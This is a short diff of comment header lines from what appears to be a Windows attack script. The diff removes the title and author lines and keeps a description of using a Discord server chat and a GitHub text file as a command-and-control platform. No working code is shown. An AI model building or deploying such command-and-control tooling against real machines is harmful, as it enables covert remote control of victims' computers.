@@ -1,6 +1,4 @@
 
-REM Title: beigeworm's Discord Command And Control.
-REM Author: @beigeworm
 REM Description: Using a Discord Server Chat and a github text file to Act as a Command and Control Platform.
 REM Target: Windows 10 and 11
 
